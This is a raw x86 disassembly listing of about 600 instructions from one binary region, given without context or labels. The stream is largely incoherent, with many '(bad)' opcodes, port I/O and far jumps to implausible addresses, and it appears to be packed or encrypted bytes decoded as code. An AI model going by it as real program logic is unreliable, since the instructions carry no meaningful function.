  40748e:	xor    DWORD PTR [ebp+0x5e],0xffffffec
  407492:	dec    DWORD PTR [eax]
  407494:	push   0x62
  407496:	jne    0x4074d1
  407498:	cmp    bl,BYTE PTR [ebp-0x74c89946]
  40749e:	inc    ebp
  40749f:	pop    ebp
  4074a0:	int3   
  4074a1:	add    ebp,DWORD PTR [eax-0x64]
  4074a4:	and    bl,al
  4074a6:	call   esi
  4074a8:	inc    ebx
  4074a9:	mov    bh,0x40
  4074ab:	xor    DWORD PTR [edi+0x20e9d217],edx
  4074b1:	add    al,0xe8
  4074b3:	add    BYTE PTR [eax+0x3aff61a2],dh
  4074b9:	mov    ds:0xfa8113d8,al
  4074be:	add    al,BYTE PTR [eax]
  4074c0:	push   cs
  4074c1:	shl    BYTE PTR [ebx+0x6b6a9cfe],0x63
  4074c8:	adc    cl,BYTE PTR [edi+0x1560e861]
  4074ce:	popa   
  4074cf:	dec    DWORD PTR [ebx+0x5fb4eb62]
  4074d5:	and    DWORD PTR [eax+ebp*2],eax
  4074d8:	or     DWORD PTR ss:[edi+0x1456e6c2],edi
  4074df:	ss imul ecx,edx,0x49836be8
  4074e6:	dec    esi
  4074e7:	popa   
  4074e8:	cmp    cl,BYTE PTR [ecx-0x43]
  4074eb:	div    DWORD PTR [esi-0x1f]
  4074ee:	out    0x3,eax
  4074f0:	into   
  4074f1:	xchg   esi,eax
  4074f2:	cdq    
  4074f3:	pusha  
  4074f4:	cmp    al,0x1
  4074f6:	inc    ecx
  4074f7:	sbb    BYTE PTR [edx+0x536c2657],dl
  4074fd:	xchg   esi,eax
  4074fe:	push   ds
  4074ff:	popa   
  407500:	or     ecx,DWORD PTR [ecx]
  407502:	add    DWORD PTR [esi-0x1],0xf1ebe8c9
  407509:	mov    esi,0x1d8603a7
  40750e:	sbb    ecx,esp
  407510:	icebp  
  407511:	or     BYTE PTR [ecx],al
  407513:	and    eax,0xcee5771
  407518:	add    BYTE PTR [ecx-0x24],dh
  40751b:	cmc    
  40751c:	mov    bl,0xf6
  40751e:	push   edi
  40751f:	push   esp
  407520:	or     al,0x49
  407522:	add    dl,dh
  407524:	pusha  
  407525:	push   esi
  407526:	pusha  
  407527:	rcr    DWORD PTR [edi+0x453574e],1
  40752d:	(bad)  [ebp+0x17]
  407530:	ret    
  407531:	ds out dx,eax
  407533:	aas    
  407534:	mov    edx,0x16ae08f1
  407539:	add    eax,edx
  40753b:	daa    
  40753c:	add    al,0x19
  40753e:	push   ecx
  40753f:	pop    esi
  407540:	pusha  
  407541:	push   ds
  407542:	add    ebp,DWORD PTR [ecx+0x38b927d7]
  407548:	popa   
  407549:	test   BYTE PTR [ecx],al
  40754b:	xchg   ecx,eax
  40754c:	arpl   WORD PTR [edi],ax
  40754e:	push   edi
  40754f:	jle    0x4075bc
  407551:	out    dx,eax
  407552:	xchg   ebp,eax
  407553:	add    BYTE PTR [esi-0x6f],dh
  407556:	jecxz  0x407557
  407558:	add    BYTE PTR [ebx-0x2516bf41],al
  40755e:	lods   al,BYTE PTR ds:[esi]
  40755f:	push   esi
  407560:	test   al,0x32
  407562:	push   esi
  407563:	xor    eax,0xffc9ea3b
  407568:	inc    eax
  407569:	popa   
  40756a:	xchg   esi,eax
  40756b:	inc    DWORD PTR [esi+0x35]
  40756e:	dec    ecx
  40756f:	je     0x40755f
  407571:	add    dh,0xfe
  407574:	mov    esp,0x2fb6612a
  407579:	adc    DWORD PTR [esi-0x18],edx
  40757c:	dec    ebp
  40757d:	add    dh,al
  40757f:	push   esi
  407580:	call   DWORD PTR [ebx-0x1e8aa862]
  407586:	or     dh,BYTE PTR [ecx]
  407588:	dec    BYTE PTR [esi]
  40758a:	adc    ebx,esp
  40758c:	sbb    DWORD PTR [esi],eax
  40758e:	pop    edi
  40758f:	push   cs
  407590:	call   0xff9685c4
  407595:	or     DWORD PTR [ebp+0x56],0x75
  407599:	loope  0x407575
  40759b:	dec    esp
  40759c:	(bad)  
  40759d:	out    0x6,al
  40759f:	push   esi
  4075a0:	jne    0x40757f
  4075a2:	(bad)  
  4075a3:	fild   DWORD PTR [edi]
  4075a5:	shl    esp,0x8f
  4075a8:	dec    esi
  4075aa:	cld    
  4075ab:	dec    edx
  4075ac:	add    al,0xe9
  4075ae:	mov    DWORD PTR [ebx+0x258beec],eax
  4075b4:	call   0xff966366
  4075b9:	loop   0x40762d
  4075bb:	fisttp QWORD PTR [ebp+0x11]
  4075be:	mov    di,0xe940
  4075c2:	loop   0x407631
  4075c4:	push   eax
  4075c5:	test   eax,0x39505676
  4075ca:	(bad)
  4075cd:	call   FWORD PTR [eax]
  4075cf:	out    0xbd,eax
  4075d1:	push   0x409ed2
  4075d6:	sbb    BYTE PTR [esi-0xc4ff78c],dh
  4075dc:	in     al,0xff
  4075de:	dec    edi
  4075df:	xchg   ebp,eax
  4075e0:	add    DWORD PTR [bx+si],eax
  4075e3:	enter  0xbde6,0x68
  4075e7:	jno    0x407588
  4075e9:	inc    eax
  4075ea:	add    BYTE PTR [eax+0x600874b6],cl
  4075f0:	and    ch,ah
  4075f2:	(bad)  
  4075f3:	call   DWORD PTR [edi+eiz*2-0x421937fe]
  4075fa:	push   0x409f67
  4075ff:	call   0x4048eaba
  407604:	pop    esp
  407605:	in     al,0xff
  407607:	aas    
  407608:	in     eax,0x19
  40760a:	mov    esp,0xc2c8b63f
  40760f:	or     BYTE PTR [ecx],0x55
  407612:	mov    ebp,DWORD PTR [edx+ecx*4]
  407615:	(bad)  
  407616:	cld    
  407617:	mov    dl,0x9
  407619:	push   0x9
  40761b:	pop    edi
  40761c:	xor    BYTE PTR [edi],al
  40761e:	call   0x3fea2f
  407623:	loope  0x407665
  407625:	sti    
  407626:	push   0x62
  407628:	mov    dh,0x74
  40762a:	or     BYTE PTR [eax-0x77],dh
  40762d:	(bad)  
  40762e:	jmp    FWORD PTR [edi+0x5f]
  407631:	and    bh,bh
  407633:	add    eax,0x7f76e805
  407638:	mov    dh,0xfe
  40763a:	push   0xfffffffc
  40763c:	mov    bl,0x74
  40763e:	or     al,al
  407640:	fs (bad) 
  407642:	(bad)  
  407643:	mov    edi,0xfc74b3
  407648:	xor    DWORD PTR [ebx-0x28],edi
  40764b:	pop    es
  40764c:	sbb    DWORD PTR ds:0x9a06ff9d,ebx
  407652:	inc    ecx
  407653:	add    al,0x31
  407655:	std    
  407656:	mov    ch,ah
  407658:	mov    esp,DWORD PTR [edx-0x15]
  40765b:	xor    eax,DWORD PTR [esi+0x13680421]
  407661:	xchg   ebx,eax
  407662:	(bad)  
  407663:	(bad)  
  407664:	(bad)  
  407666:	xor    DWORD PTR [eax+0x70],ecx
  407669:	bound  ebp,QWORD PTR [ebx-0x2e]
  40766c:	pop    ebx
  40766e:	pop    ebp
  40766f:	or     esi,ecx
  407671:	xchg   esi,eax
  407672:	clc    
  407673:	dec    edi
  407674:	mov    esi,0x3cfef39d
  407679:	outs   dx,BYTE PTR ds:[esi]
  40767a:	mov    bl,0xfe
  40767c:	and    al,0x6a
  40767e:	imul   ebx,DWORD PTR [eax-0x17a1d473],0xffffffd0
  407685:	out    0x5d,eax
  407687:	dec    DWORD PTR [ebx]
  407689:	(bad)  
  40768a:	jmp    0x4076bf
  40768c:	out    0xa0,al
  40768e:	add    ebp,DWORD PTR [eax+0x53]
  407691:	jae    0x407657
  407693:	call   DWORD PTR [esi]
  407695:	pusha  
  407696:	add    eax,DWORD PTR [eax]
  407698:	mov    cl,0xa
  40769a:	mov    ds:0x9636ebe,al
  40769f:	rcr    ch,0x54
  4076a2:	mov    bl,0xfe
  4076a4:	in     al,0x51
  4076a6:	pop    esp
  4076a7:	jne    0x4076ce
  4076a9:	adc    bl,BYTE PTR [ebp+0x75]
  4076ac:	add    BYTE PTR [ecx],bh
  4076ae:	dec    edx
  4076af:	jmp    0x407694
  4076b1:	inc    esi
  4076b2:	dec    ebx
  4076b3:	ins    BYTE PTR es:[edi],dx
  4076b4:	jb     0x407730
  4076b6:	xchg   ebx,eax
  4076b7:	pop    ebp
  4076b8:	(bad)  
  4076b9:	mov    esp,0x3d755c31
  4076be:	retf   0x56fb
  4076c1:	jo     0x4076cc
  4076c3:	jmp    0x91421b24
  4076c8:	or     BYTE PTR ds:0xf34b9654,0x4
  4076cf:	jmp    0x6aa5328a
  4076d4:	dec    eax
  4076d5:	std    
  4076d6:	fsubp  st(0),st
  4076d8:	jmp    0xc3ccb05
  4076dd:	(bad)  [ecx-0x7e19a2cf]
  4076e3:	lods   al,BYTE PTR ds:[esi]
  4076e4:	pop    edi
  4076e5:	dec    ecx
  4076e6:	or     ecx,ebp
  4076e8:	ins    BYTE PTR es:[edi],dx
  4076e9:	xchg   edi,eax
  4076ea:	loopne 0x4076d5
  4076ec:	mov    ah,0x71
  4076ee:	or     DWORD PTR [esi-0x29],ecx
  4076f1:	cs popa 
  4076f3:	leave  
  4076f4:	pop    esp
  4076f5:	mov    esi,0x3102d153
  4076fa:	fs ja  0x4076e9
  4076fd:	cmp    al,0xbc
  4076ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407700:	add    esp,DWORD PTR [esi-0x10940f23]
  407706:	push   ebx
  407707:	push   ds
  407708:	pop    ebp
  407709:	xchg   esi,eax
  40770a:	fst    QWORD PTR [ebx*2+0x77010104]
  407711:	add    cl,cl
  407713:	push   ebx
  407714:	push   es
  407715:	dec    ebx
  407716:	jae    0x407724
  407718:	jmp    0x68a522d3
  40771d:	dec    eax
  40771e:	mov    DWORD PTR [ebx-0x12],ebx
  407721:	pop    esp
  407722:	mov    ah,0xcd
  407724:	in     al,0xb3
  407726:	pop    edi
  407727:	fucomp st(4)
  407729:	pop    esp
  40772a:	sbb    al,0x37
  40772c:	and    ebx,eax
  40772e:	dec    esi
  40772f:	imul   eax,DWORD PTR [ebx],0xffffffa5
  407732:	xor    DWORD PTR [ecx],ecx
  407734:	repnz inc ebx
  407736:	mov    fs,WORD PTR cs:[ecx+0x93102]
  40773d:	scas   al,BYTE PTR es:[edi]
  40773e:	neg    DWORD PTR [edx+0x0]
  407741:	jmp    0x2d078078
  407746:	jns    0x40779a
  407748:	pop    es
  407749:	jmp    0x3405680
  40774e:	xor    eax,0x2d02ffdf
  407753:	test   BYTE PTR [ebp+0x7d],al
  407756:	ret    0x8585
  407759:	jne    0x4077b8
  40775b:	push   edx
  40775c:	call   FWORD PTR [ecx]
  40775e:	mov    esp,ds
  407760:	imul   DWORD PTR [esi-0x1]
  407763:	dec    esi
  407764:	call   0x4a0bce
  407769:	bnd jb 0x407749
  40776c:	add    al,0x40
  40776e:	dec    ecx
  40776f:	or     BYTE PTR [eax],al
  407771:	jmp    0xa8891c50
  407776:	add    BYTE PTR [edx],dh
  407778:	push   edx
  407779:	jne    0x407768
  40777b:	dec    edx
  40777c:	les    edi,FWORD PTR [ebp-0x7546f2ca]
  407782:	sbb    DWORD PTR [edi-0x2e10b74],esi
  407788:	push   ecx
  407789:	push   eax
  40778a:	mov    ebx,0x16be140a
  40778f:	in     eax,dx
  407790:	jg     0x407717
  407792:	sbb    ebp,ebx
  407794:	push   ecx
  407795:	call   DWORD PTR [ecx]
  407797:	add    DWORD PTR [edi+0x5289feff],ecx
  40779d:	movs   WORD PTR es:[di],WORD PTR ds:[si]
  4077a0:	leave  
  4077a1:	(bad)  
  4077a2:	in     eax,dx
  4077a3:	mov    esp,0xfae6f759
  4077a8:	push   ecx
  4077a9:	xor    eax,0xffc965bb
  4077ae:	rol    dh,0x93
  4077b1:	dec    esi
  4077b3:	mov    ah,0x8c
  4077b5:	in     al,0x0
  4077b7:	jg     0x407767
  4077b9:	(bad)  
  4077ba:	push   0x48
  4077bc:	pop    esi
  4077bd:	mov    al,ds:0xff0d5957
  4077c2:	mov    ch,0xe8
  4077c4:	mov    ch,0xfe
  4077c6:	call   edi
  4077c8:	not    ecx
  4077ca:	dec    eax
  4077cb:	dec    ecx
  4077cc:	or     eax,0xae6575e8
  4077d1:	dec    BYTE PTR [ecx-0x91e73]
  4077d7:	mov    bh,0x62
  4077d9:	jmp    DWORD PTR [edi+0x0]
  4077dc:	nop
  4077dd:	xchg   esi,eax
  4077de:	inc    eax
  4077df:	add    BYTE PTR [edi+0x78],ah
  4077e2:	lock not DWORD PTR [edi-0x52]
  4077e6:	(bad)  
  4077e7:	xor    eax,0x40451a
  4077ec:	adc    BYTE PTR [esi-0x7b980044],0x85
  4077f3:	call   0x6b3f2657
  4077f8:	enter  0xa95d,0x57
  4077fc:	mov    DWORD PTR ds:0xb668b5ff,eax
  407802:	(bad)  
  407803:	call   DWORD PTR [edi-0x8]
  407806:	ror    DWORD PTR [eax-0x37],1
  407809:	add    eax,0xadf539e8
  40780e:	dec    BYTE PTR [ecx-0x912e3]
  407814:	aaa    
  407815:	add    BYTE PTR [ebp-0x1518028],0x50
  40781c:	mov    al,ds:0x58415781
  407821:	scas   al,BYTE PTR es:[edi]
  407822:	mov    ah,0xf0
  407824:	pop    edi
  407825:	scas   al,BYTE PTR es:[edi]
  407826:	(bad)  
  407827:	(bad)  
  407828:	cmp    eax,0x4841481b
  40782d:	fst    QWORD PTR ds:0x5a3b31bd
  407833:	or     esi,DWORD PTR [ecx-0x45]
  407836:	cld    
  407837:	cmp    BYTE PTR [edi+eiz*4+0x52],0xff
  40783c:	ss imul edx,eax,0xf
  407840:	add    BYTE PTR [esi],ch
  407842:	push   ebx
  407843:	mov    al,BYTE PTR [ebp-0xa567fb]
  407849:	cmp    DWORD PTR [edx+0x66],0x6e7016b9
  407850:	adc    al,0x3a
  407852:	mov    ds:0x8a6105cf,al
  407857:	xor    bh,BYTE PTR [ecx-0x7abd7802]
  40785d:	aad    0xd7
  40785f:	pop    ecx
  407860:	inc    DWORD PTR [edx+eiz*2+0x3]
  407864:	add    BYTE PTR [edx-0x2108a0e3],dh
  40786a:	out    0x2,eax
  40786c:	je     0x4078ba
  40786e:	jecxz  0x407807
  407870:	in     al,dx
  407871:	(bad)  
  407872:	mov    bh,0x59
  407874:	add    BYTE PTR ds:0xc9bd869e,bh
  40787a:	cvtps2pd xmm7,xmm7
  40787d:	xor    DWORD PTR [esi+0x623167b6],edx
  407883:	push   0xffffffbe
  407885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407886:	xchg   ebp,eax
  407887:	or     ebp,eax
  407889:	pop    es
  40788a:	mov    al,0x59
  40788c:	call   DWORD PTR [esi-0x7108994b]
  407892:	neg    DWORD PTR [ecx+0x75]
  407895:	cmp    DWORD PTR [edx],ecx
  407897:	lods   eax,DWORD PTR ds:[esi]
  407898:	mov    dh,0x7e
  40789a:	pop    es
  40789b:	pop    edx
  40789c:	mov    ch,0x89
  40789e:	push   edi
  40789f:	pop    ecx
  4078a0:	jmp    FWORD PTR [esi-0x33]
  4078a3:	or     ch,al
  4078a5:	add    ch,al
  4078a7:	sbb    BYTE PTR [edx-0x1],bl
  4078aa:	pop    esi
  4078ab:	or     DWORD PTR [eax+eiz*2+0x59de505e],ebx
  4078b2:	les    eax,FWORD PTR [eax]
  4078b4:	ror    DWORD PTR [edx+0x59ce507f],0x84
  4078bb:	imul   edi,DWORD PTR [esi+0x34503659],0x7f89190c
  4078c5:	pop    ecx
  4078c6:	es push eax
  4078c8:	je     0x407902
  4078ca:	es push eax
  4078cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078cd:	pop    ecx
  4078ce:	pushf  
  4078cf:	add    DWORD PTR [ecx-0x69b03b0c],edx
  4078d5:	pop    ecx
  4078d6:	mov    esp,0xfe599664
  4078db:	pusha  
  4078dc:	sbb    eax,0x7e4ff69b
  4078e1:	(bad)  
  4078e2:	fst    QWORD PTR [edi+0x76]
  4078e5:	pop    ecx
  4078e6:	fld    st(1)
  4078e8:	das    
  4078e9:	pop    ecx
  4078ea:	fimul  WORD PTR [edi-0x64]
  4078ed:	ins    BYTE PTR es:[edi],dx
  4078ee:	fimul  WORD PTR [edi+0x5e]
  4078f1:	ins    BYTE PTR es:[edi],dx
  4078f2:	setb   BYTE PTR [esi+0x59]
  4078f6:	(bad)  
  4078f7:	xchg   ebp,eax
  4078f8:	dec    ecx
  4078f9:	push   ecx
  4078fa:	mov    esi,0x7815514f
  4078ff:	dec    edi
  407900:	ds pop ecx
  407902:	in     al,0x58
  407904:	ds pop ecx
  407906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407907:	pusha  
  407908:	add    DWORD PTR [ebx+0x264f9e00],ebx
  40790e:	mov    edi,0x59d6619e
  407913:	mov    cs,WORD PTR [edi+0x16]
  407916:	iret   
  407917:	mov    ah,BYTE PTR [eax-0x5b]
  40791a:	sahf   
  40791b:	xor    DWORD PTR [ecx],ecx
  40791d:	xor    BYTE PTR [esi+0x29],al
  407920:	or     DWORD PTR [esp+ecx*4+0x2d008b5d],edx
  407927:	add    eax,0x2d82ffe3
  40792c:	push   eax
  40792d:	jne    0x407920
  40792f:	retf   0xb612
  407932:	fsubp  st(1),st
  407934:	add    DWORD PTR [ebp-0x2b],0x39f7c5af
  40793b:	dec    ebp
  40793c:	mov    ebx,0xe12d2856
  407941:	aas    
  407942:	push   ss
  407943:	repnz dec esi
  407945:	(bad)  
  407946:	cld    
  407947:	pop    esp
  407948:	rol    DWORD PTR [eax-0x17],0x8a
  40794c:	dec    edi
  40794d:	mov    ebx,0xc00279a6
  407952:	adc    eax,0xe867bf00
  407957:	xor    bl,BYTE PTR [esi-0x42]
  40795a:	mov    gs,edi
  40795c:	push   esi
  40795d:	push   eax
  40795e:	xchg   bh,ah
  407960:	push   es
  407961:	call   0xff8ea1d7
  407966:	xor    DWORD PTR [ebp-0x6f],0xc4b76eff
  40796d:	idiv   DWORD PTR [ecx+0x56ebca00]
  407973:	test   al,0x32
  407975:	loope  0x4079b6
  407977:	mov    esi,0x14fe4ef3
  40797c:	pop    es
  40797d:	rol    DWORD PTR [eax-0x17],0x4a
  407981:	inc    ebx
  407982:	mov    ebx,0xc002093e
  407987:	mov    ebp,0xeb67bea1
  40798c:	xor    bl,BYTE PTR [esi-0x42]
  40798f:	es addr16 push esi
  407992:	push   eax
  407993:	push   ds
  407994:	jg     0x40799c
  407996:	call   0xff8ec258
  40799b:	add    DWORD PTR [ecx],eax
  40799d:	xchg   ecx,eax
  40799e:	inc    DWORD PTR [eax]
  4079a0:	das    
  4079a1:	bound  esi,QWORD PTR [edx+0x57]
  4079a4:	cdq    
  4079a5:	or     bh,bh
  4079a7:	jne    0x4079f9
  4079a9:	loop   0x407a21
  4079ab:	std    
  4079ac:	dec    edi
  4079ad:	mov    dh,0xfe
  4079af:	jne    0x4079fd
  4079b1:	mov    dh,0x74
  4079b3:	or     BYTE PTR [eax-0x50],ah
  4079b6:	mov    ah,0xff
  4079b8:	pop    edi
  4079b9:	mov    esp,0x994804c1
  4079be:	mov    ch,ah
  4079c0:	leave  
  4079c1:	enter  0xf7db,0xef
  4079c5:	mov    ch,0x8c
  4079c7:	inc    ebp
  4079c8:	fcom   QWORD PTR [esi+edi*8+0x34b6fc75]
  4079cf:	shl    BYTE PTR [eax+0x44],cl
  4079d2:	jmp    edi
  4079d4:	add    BYTE PTR [edx+0x130000a9],cl
  4079da:	retf   0x850e
  4079dd:	leave  
  4079de:	add    eax,DWORD PTR [eax]
  4079e0:	add    bh,al
  4079e2:	inc    edi
  4079e3:	test   DWORD PTR [eax],0xc70009d8
  4079e9:	adc    eax,0xc807feb9
  4079ee:	or     DWORD PTR [edx+0x0],ebp
  4079f1:	add    cl,BYTE PTR [edx]
  4079f3:	push   0x0
  4079f5:	loop   0x407a00
  4079f7:	lea    eax,[ebp+0x64]
  4079fa:	xchg   ebp,eax
  4079fb:	mov    WORD PTR [ebp-0x1419c],es
  407a01:	cwde   
  407a02:	mov    dh,0x74
  407a04:	clc    
  407a05:	outs   dx,DWORD PTR ds:[esi]
  407a06:	cmp    bl,bh
  407a08:	call   0x40e781
  407a0d:	xchg   ebx,eax
  407a0e:	leave  
  407a0f:	jae    0x407a16
  407a11:	inc    ecx
  407a12:	mov    DWORD PTR [ecx],eax
  407a14:	add    BYTE PTR [eax+0x3148ad61],bl
  407a1a:	mov    eax,ds:0x2c04ff03
  407a1f:	imul   esi,DWORD PTR [ebp+0x505706ba],0xffffffba
  407a26:	out    dx,eax
  407a27:	mov    BYTE PTR [ebp-0xa9b1a3],al
  407a2d:	add    DWORD PTR [edx+0x6b],esi
  407a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a31:	call   0x4e2f:0xb4895666
  407a38:	inc    DWORD PTR [eax]
  407a3a:	inc    esi
  407a3b:	inc    edi
  407a3c:	pop    edx
  407a3d:	mov    bh,0x3e
  407a3f:	ds jmp 0xaeb04944
  407a45:	inc    eax
  407a46:	xor    DWORD PTR [ebx-0x6be10f70],ecx
  407a4c:	push   esi
  407a4d:	jmp    DWORD PTR [eax+esi*2-0x35]
  407a51:	inc    eax
  407a52:	xor    DWORD PTR [edx+0x5a],edi
  407a55:	mov    edx,0x858c6c0e
  407a5a:	or     eax,0x8bff566c
  407a5f:	(bad)  
  407a60:	jmp    0x407a1a
  407a62:	pop    esi
  407a63:	and    DWORD PTR [edi+edi*8],eax
  407a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a67:	ror    BYTE PTR [ebp-0x1],cl
  407a6a:	out    0xd3,al
  407a6c:	psrld  mm5,QWORD PTR [ecx+0x21]
  407a70:	add    al,0xe8
  407a72:	hlt    
  407a73:	test   al,0x56
  407a75:	(bad)  
  407a76:	mov    eax,0xc6f766e5
  407a7b:	mov    bl,0xe8
  407a7d:	call   DWORD PTR [esi+0x20]
  407a80:	scas   al,BYTE PTR es:[edi]
  407a81:	inc    eax
  407a82:	xor    ebx,eax
  407a84:	(bad)  
  407a85:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a87:	or     edx,DWORD PTR [esi-0x1]
  407a8a:	pop    esp
  407a8b:	lock retf 0x3140
  407a8f:	retf   0xba95
  407a92:	xchg   esi,eax
  407a93:	or     DWORD PTR [esi],esp
  407a95:	mov    WORD PTR [ecx+ebp*2-0x2079a9ea],?
  407a9c:	call   0xb4b77b8c
  407aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aa2:	add    esi,DWORD PTR [esi-0x6a]
  407aa5:	stc    
  407aa6:	dec    ebp
  407aa7:	outs   dx,BYTE PTR ds:[esi]
  407aa8:	dec    esp
  407aa9:	dec    BYTE PTR [edi]
  407aab:	add    ecx,0xffffffa7
  407aae:	add    ecx,DWORD PTR [ecx-0x56]
  407ab1:	xor    edx,DWORD PTR [esi+0x56]
  407ab4:	sub    BYTE PTR [esp+ebp*2+0x46],0x4c
  407ab9:	fsubp  st(2),st
  407abb:	inc    esi
  407abc:	in     al,0xaf
  407abe:	lods   eax,DWORD PTR ds:[esi]
  407abf:	icebp  
  407ac0:	or     dh,cl
  407ac2:	pop    DWORD PTR [ecx+0x54]
  407ac5:	(bad)  
  407ac6:	push   ebp
  407ac7:	cs push ss
  407ac9:	fwait
  407aca:	int3   
  407acb:	jno    0x407ad6
  407acd:	rol    DWORD PTR [ecx-0x7451b425],0xac
  407ad4:	sub    al,0x9e
  407ad6:	push   ebp
  407ad7:	push   cs
  407ad8:	mov    BYTE PTR [eax+eiz*2-0x2],bl
  407adc:	dec    ebx
  407add:	xchg   esi,eax
  407ade:	add    al,0x85
  407ae0:	out    0x69,al
  407ae2:	xchg   edi,eax
  407ae3:	add    eax,0x31558654
  407ae8:	aad    0x1c
  407aea:	and    DWORD PTR [eax+eiz*2+0x8de557e],0x94eb0f5
  407af5:	jmp    0xd48c0a5e
  407afa:	or     ebx,ecx
  407afc:	pop    edx
  407afd:	call   0x68:0x944bbe55
  407b04:	mov    esi,0x2455464b
  407b09:	add    DWORD PTR [ecx-0x3e],edx
  407b0c:	loop   0x407b59
  407b0e:	add    BYTE PTR [esi],dh
  407b10:	add    al,0x96
  407b12:	call   0xff8c774d
  407b17:	pushf  
  407b18:	cmp    ah,BYTE PTR [ecx+0x34]
  407b1b:	push   ebp
  407b1c:	fmul   QWORD PTR [ebx-0x1]
  407b1f:	pop    esp
  407b20:	adc    DWORD PTR [edi+edi*8+0xe],edx
  407b24:	(bad)  
  407b26:	pop    es
  407b27:	adc    DWORD PTR [edi-0x6b],ecx
  407b2a:	(bad)  
  407b2b:	(bad)  
  407b2c:	std    
  407b2d:	xchg   ebp,eax
  407b2e:	loopne 0x407b2e
  407b30:	add    eax,0x2a74ff4c
  407b35:	popa   
  407b36:	sbb    BYTE PTR [ebp-0x6b00b41b],bl
  407b3c:	(bad)  
  407b3d:	push   ebx
  407b3e:	call   esi
  407b40:	in     eax,0xd5
  407b42:	pop    es
  407b43:	shr    DWORD PTR [eax],0x95
  407b46:	inc    esi
  407b48:	test   DWORD PTR [esp+eiz*8-0x17b5824a],edx
  407b4f:	lds    ebp,FWORD PTR [edx+ecx*2+0x5da7aeff]
  407b56:	mul    DWORD PTR [esi+0x57e16165]
  407b5c:	pop    ebp
  407b5d:	dec    edx
  407b5e:	call   FWORD PTR [edx+ecx*4+0x52]
  407b62:	dec    DWORD PTR [esi-0x7949cc76]
  407b68:	add    BYTE PTR [ebp+0x7589b54a],al
  407b6e:	dec    edx
  407b6f:	inc    DWORD PTR [ecx+0x6eff9369]
  407b75:	jge    0x407b0b
  407b77:	fcomp  QWORD PTR [esi+0x65]
  407b7a:	dec    edx
  407b7b:	call   0xff8b2fa9
  407b80:	push   esi
  407b81:	scas   eax,DWORD PTR es:[edi]
  407b82:	pop    ecx
  407b83:	test   DWORD PTR [esi+0x5d],0xa000754a
  407b8a:	fidiv  WORD PTR [esi]
  407b8c:	(bad)  
  407b8d:	addr16 mov ch,0xfe
  407b90:	mov    ch,0x58
  407b92:	mov    ebp,0x6cf0fffe
  407b97:	mov    dh,0xff
  407b99:	push   edi
  407b9a:	mov    ch,0x44
  407b9c:	clc    
  407b9d:	and    DWORD PTR [ebp+edi*8-0x1],eax
  407ba1:	daa    
  407ba2:	mov    ch,0x74
  407ba4:	cld    
  407ba5:	xor    cl,cl
  407ba7:	mov    eax,ds:0xc1bf5800
  407bac:	or     BYTE PTR [eax-0x65],bl
  407baf:	mov    ch,ah
  407bb1:	retf   
  407bb2:	or     esp,edi
  407bb4:	push   0x48
  407bb6:	pusha  
  407bb7:	or     edi,edi
  407bb9:	in     eax,dx
  407bba:	dec    esp
  407bbb:	out    0xb9,eax
  407bbd:	stos   DWORD PTR es:[edi],eax
  407bbe:	mov    dh,0xfe
  407bc0:	mov    DWORD PTR ds:0xffe567b9,ecx
  407bc6:	inc    ebx
  407bc7:	(bad)  
  407bc8:	(bad)  
  407bc9:	ins    DWORD PTR es:[edi],dx
  407bca:	dec    ebp
  407bcb:	out    0xf6,eax
  407bcd:	add    ch,ah
  407bcf:	mov    ch,0xfe
  407bd1:	call   FWORD PTR [ebp-0x47]
  407bd4:	(bad)  
  407bd5:	jne    0x407be7
  407bd7:	scas   al,BYTE PTR es:[edi]
  407bd8:	jecxz  0x407b8d
  407bda:	xlat   BYTE PTR ds:[ebx]
  407bdb:	mov    ch,0xc8
  407bdd:	ret    0x60c
  407be0:	push   ebp
  407be1:	mov    esi,DWORD PTR [ebx+eax*4-0x4a602f3c]
  407be8:	dec    BYTE PTR [ebp-0xb046e3]
  407bee:	fisttp QWORD PTR [ecx-0x2]
  407bf1:	xor    eax,0x408cba
  407bf6:	mov    al,0x3b
  407bf8:	mov    eax,ds:0xbf4ad800
  407bfd:	cmovge edi,ebx
  407c00:	add    DWORD PTR [eax],eax
  407c02:	xor    DWORD PTR [eax+0x4a],esp
  407c05:	inc    ebp
  407c06:	mov    ecx,0x3100035f
  407c0b:	sbb    ecx,ecx
  407c0d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c0f:	bound  eax,QWORD PTR [ebx]
  407c11:	add    BYTE PTR [ebx],cl
  407c13:	pusha  
  407c14:	(bad)  
  407c16:	or     BYTE PTR [eax-0x23],ah
  407c19:	(bad)  
  407c1a:	mov    ebp,0xb450579c
  407c1f:	in     al,0x57
  407c21:	idiv   DWORD PTR [esi-0xe]
  407c24:	mov    bl,0xfe
  407c26:	cld    
  407c27:	not    DWORD PTR [edx+0x75]
  407c2a:	ins    DWORD PTR es:[edi],dx
  407c2b:	idiv   DWORD PTR [esi-0x19fce5f]
  407c31:	mov    edi,0x5c5ce500
  407c36:	std    
  407c37:	xor    BYTE PTR [eax+0x3],ah
  407c3a:	push   0xffc5179f
  407c3f:	inc    edi
  407c40:	mov    ah,0xff
  407c42:	out    0x9d,eax
  407c44:	js     0x407c98
  407c46:	jmp    FWORD PTR [edx+0x2585808f]
  407c4c:	mov    BYTE PTR [edx-0x1],dl
  407c4f:	and    DWORD PTR [esp+ebx*2],0x527fd8e1
  407c56:	mov    DWORD PTR [edx+eax*4+0x1d0eff5a],ebp
  407c5d:	add    al,0x68
  407c5f:	jo     0x407c2b
  407c61:	(bad)  
  407c62:	(bad)  
  407c63:	jmp    ebp
  407c65:	push   edx
  407c66:	div    esi
  407c68:	xchg   edi,eax
  407c69:	push   edx
  407c6a:	xor    eax,0xffc4fb03
  407c6f:	into   
  407c70:	call   0xe487:0xa9deff8b
  407c77:	fidiv  WORD PTR [edi+0x9316a51]
  407c7d:	rcl    DWORD PTR ds:0x52e8ca69,1
  407c83:	test   BYTE PTR [ecx],bh
  407c85:	pop    esi
  407c86:	push   edx
  407c87:	mov    dh,0x48
  407c89:	adc    al,0x36
  407c8b:	stc    
  407c8c:	leave  
  407c8d:	call   0x3ec1f7ed
  407c92:	push   edx
  407c93:	test   al,0x8e
  407c95:	inc    ebp
  407c96:	pop    edx
